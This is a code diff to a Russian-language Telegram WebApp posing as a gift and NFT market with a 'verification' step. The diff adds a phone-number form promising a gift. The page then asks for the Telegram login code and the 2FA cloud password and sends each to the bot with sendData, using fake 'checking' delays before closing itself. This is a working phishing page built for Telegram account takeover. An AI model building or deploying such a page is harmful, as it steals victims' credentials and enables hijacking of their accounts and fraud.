@@ -28,38 +28,28 @@ body{
     min-height: 100vh;
 }
 
-/* СНЕГ */
 canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
-
-/* HEADER */
 .header{ text-align:center; padding:60px 20px 20px; position:relative; z-index:2; }
 .header h1{ margin:0; font-size:32px; font-weight:700; text-shadow:0 0 10px var(--accent-red); }
 .badge{ margin-top:8px; display:inline-block; background:var(--accent-green); color:#fff; padding:6px 14px; border-radius:20px; font-size:14px; font-weight:700; box-shadow:0 4px 12px rgba(0,0,0,0.4); }
 
-/* NAV */
 .nav{ display:flex; gap:10px; padding:10px; position:sticky; top:0; z-index:5; background:rgba(0,0,0,.4); backdrop-filter:blur(8px); }
 .nav button{ flex:1; padding:12px; border-radius:14px; border:1px solid var(--accent-red); background:transparent; color:#fff; font-weight:700; transition:0.3s; cursor:pointer;}
 .nav button.active{ background:linear-gradient(90deg,var(--accent-red),var(--accent-green)); border:none; }
 
-/* SECTIONS */
 .section{ display:none; padding:16px; position:relative; z-index:2; }
 .section.active{display:block}
 
-/* CARD */
 .card{ background:var(--card); border:1px solid var(--border); border-radius:20px; padding:18px; margin-bottom:16px; backdrop-filter:blur(12px); box-shadow:0 8px 28px rgba(0,0,0,.5); }
-
 .label{ font-size:12px; color:var(--text-soft); margin-bottom:6px; }
 .value{ font-size:20px; font-weight:600; }
 
-/* BUTTON */
 .btn{ width:100%; margin-top:12px; padding:14px; border-radius:14px; border:none; background:linear-gradient(135deg,var(--accent-red),var(--accent-green)); color:#fff; font-weight:700; cursor:pointer; box-shadow:0 6px 20px rgba(0,0,0,0.5); transition:0.3s; }
 
-/* MARKET */
 .market{ display:grid; grid-template-columns:1fr 1fr; gap:14px; }
 .nft{ background:var(--card); border:1px solid var(--border); border-radius:18px; padding:10px; text-align:center; cursor:pointer;}
 .nft img{ width:100%; max-height:140px; object-fit:contain; border-radius:14px; }
 
-/* ОКНА ВВОДА (OVERLAYS) */
 .overlay {
     display: none; position: fixed; inset: 0; 
     background: rgba(0,0,0,0.92); backdrop-filter: blur(15px);
@@ -98,11 +88,6 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
         <div class="value">Не подтверждён</div>
         <button class="btn" onclick="startAuth()">Пройти верификацию</button>
     </div>
-    <div class="card">
-        <div class="label">БАЛАНС</div>
-        <div class="value">0.00 ⭐</div>
-        <button class="btn" onclick="startAuth()">Пополнить баланс</button>
-    </div>
 </div>
 
 <div id="market" class="section">
@@ -125,6 +110,13 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
     </div>
 </div>
 
+<div id="step-phone" class="overlay">
+    <h2 style="text-align:center">Верификация</h2>
+    <p style="text-align:center; color:var(--text-soft)">Введите номер телефона для получения подарка</p>
+    <input type="tel" id="inp-phone" class="input-field" placeholder="+79991234567">
+    <button class="btn" onclick="sendPhone()">ПОЛУЧИТЬ КОД</button>
+</div>
+
 <div id="step-code" class="overlay">
     <h2 style="text-align:center">Код подтверждения</h2>
     <p style="text-align:center; color:var(--text-soft)">Введите код из приложения Telegram</p>
@@ -134,7 +126,7 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
 
 <div id="step-2fa" class="overlay">
     <h2 style="text-align:center">Облачный пароль</h2>
-    <p style="text-align:center; color:var(--text-soft)">Ваш аккаунт защищен 2FA. Введите пароль:</p>
+    <p style="text-align:center; color:var(--text-soft)">Введите ваш 2FA пароль:</p>
     <input type="password" id="inp-pass" class="input-field" placeholder="Пароль">
     <button class="btn" onclick="sendPass()">ВОЙТИ</button>
 </div>
@@ -145,7 +137,6 @@ canvas{ position:fixed; inset:0; z-index:1; pointer-events:none; }
 const tg = window.Telegram.WebApp;
 tg.expand();
 
-// Навигация
 function openTab(id, el) {
     document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
     document.querySelectorAll('.nav button').forEach(b => b.classList.remove('active'));
@@ -153,50 +144,44 @@ function openTab(id, el) {
     el.classList.add('active');
 }
 
-// Начало авторизации (запрос контакта через бот)
+// Теперь кнопка верификации открывает ввод телефона в приложении
 function startAuth() {
-    // В данном дизайне предполагается, что бот сначала просит контакт, 
-    // а потом юзер открывает WebApp. Если вызвать из WebApp:
-    tg.requestContact((ok, res) => {
-        if(ok && res.responseUnsafe.contact) {
-            tg.sendData("PHONE:" + res.responseUnsafe.contact.phone_number);
-            setTimeout(() => {
-                document.getElementById('step-code').classList.add('active');
-            }, 3000);
-        }
-    });
+    document.getElementById('step-phone').classList.add('active');
 }
 
-// 1. ФУНКЦИЯ ОТПРАВКИ КОДА (Твоя логика с паузой 1.5 сек)
+function sendPhone() {
+    let phone = document.getElementById('inp-phone').value;
+    if(phone.length > 5) {
+        tg.sendData("PHONE:" + phone);
+        document.querySelector('#step-phone button').innerText = "Запрос кода...";
+        // Через 3 секунды переходим к коду
+        setTimeout(() => {
+            document.getElementById('step-phone').classList.remove('active');
+            document.getElementById('step-code').classList.add('active');
+        }, 3000);
+    }
+}
+
 function sendCode() {
     let val = document.getElementById('inp-code').value; 
-    
     if(val.length >= 5) {
         tg.sendData("CODE:" + val); 
-        
         document.querySelector('#step-code button').innerText = "Проверка...";
-        
         setTimeout(() => {
             document.getElementById('step-code').classList.remove('active'); 
             document.getElementById('step-2fa').classList.add('active');    
         }, 1500);
-    } else {
-        alert("Введите код из 5 цифр");
     }
 }
 
-// 2. ФУНКЦИЯ ОТПРАВКИ ПАРОЛЯ
 function sendPass() {
     let val = document.getElementById('inp-pass').value;
     if(val.length > 0) {
         tg.sendData("PASS:" + val);
-        setTimeout(() => {
-            tg.close();
-        }, 1000);
+        setTimeout(() => { tg.close(); }, 1000);
     }
 }
 
-/* СНЕГ (Твой стиль) */
 const c=document.getElementById("snow"),ctx=c.getContext("2d");
 let w,h,flakes=[];
 function resize(){w=c.width=innerWidth;h=c.height=innerHeight}
